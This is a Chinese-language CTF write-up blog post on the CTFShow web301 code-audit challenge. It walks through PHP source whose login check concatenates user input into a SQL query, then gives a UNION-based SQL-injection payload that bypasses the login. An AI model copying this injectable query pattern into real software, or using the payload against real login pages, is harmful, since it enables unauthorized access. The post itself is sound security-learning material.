---
author: "Yiming Shen"
date: 2022-07-29
lastmod: 2022-07-29
title: "CTFShow web301-310 WP"
tags: [
    "CTF",
    "Audit",
    "Web",
    "Note",
    "WriteUP",
]
categories: [
    "Notes",
     "CTF",
]
showtoc: true
math: true
---

## 前言

开始刷一下CTFShow代码审计部分，题目才刷了一道，给博客划分这部分框架倒是花了一个点，为这篇文章到底放在Audit里还是WP里纠结半天。不过为了隆重地证明我开始学习代码审计了，还是单开一个Category吧

## Web301

下载源代码，先用VSCode打开

![image-20220729120308745](https://s2.loli.net/2022/07/29/YhXnKWbfN5TmUvj.png)

先看下`.sql`数据库连接文件，有无泄露密码之类的

![image-20220729120441553](https://s2.loli.net/2022/07/29/nptSg4MFI16AOuL.png)

无敏感信息，就是能看出表的结构了，id+Username+password，这么个三列表，导入Seay审计看一下

![image-20220729121435464](https://s2.loli.net/2022/07/29/1d6AOVv8oMuG4xa.png)

目录结构比较简单，admin页面都是静态网址，看来主要应当关注外面的几个php文件，自动扫描一下，误报率很高的Seay居然什么都没说，看来应该没什么复杂功能，不用登进去打点文件包含命令执行啥的。

那就乖乖从入口`index.php`开始，

```php
<?php
session_start();
require "conn.php";
if(!isset($_SESSION['login'])){
header("location:login.php");
}
?>
```

包含了`conn.php`，跳转到了`login.php`

```php
<?php

$mysqluser="root";
$mysqlpwd="*******";
$mysqldb="sds";
$mysqlhost="localhost";
$mysqlport="3306";
$mysqli=@new mysqli($mysqlhost,$mysqluser,$mysqlpwd,$mysqldb);
if(mysqli_connect_errno()){
	die(mysqli_connect_error());
}


?>

```

`conn.php`，数据库连接信息，密码看不到

```php
<?php
error_reporting(0);
session_start();
require 'conn.php';
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
$_SESSION['error']="1";
header("location:login.php");

?>
```

直接看`checklogin.php`，没预编译啥的，应该是存在SQL注入，关键就是怎么利用了。

给出源代码的SQL注入那可太容易了，尝试了几个以后，啪，很快啊，就进去了

```sql
userid=1'union select 1#
```

![image-20220729122240116.png](https://s2.loli.net/2022/07/29/Ky53GeYzWItXLDi.png)

拿到flag，本题over。

复现一下这个SQL注入，用Navicat创建一个表

![image-20220729122836188.png](https://s2.loli.net/2022/07/29/b3WzNgiRYphq2oL.png)

模拟一下源程序的查询SQL语句：

![image-20220729123042661.png](https://s2.loli.net/2022/07/29/2tuL95bJeznmgVI.png)

查username对应的密码，如果有查询结果就直接登录成功，这样的话用联合查询，把用户输入的密码插入本来是空的结果即可。

![image-20220729123325102.png](https://s2.loli.net/2022/07/29/MthnxgfP1FpGq2H.png)







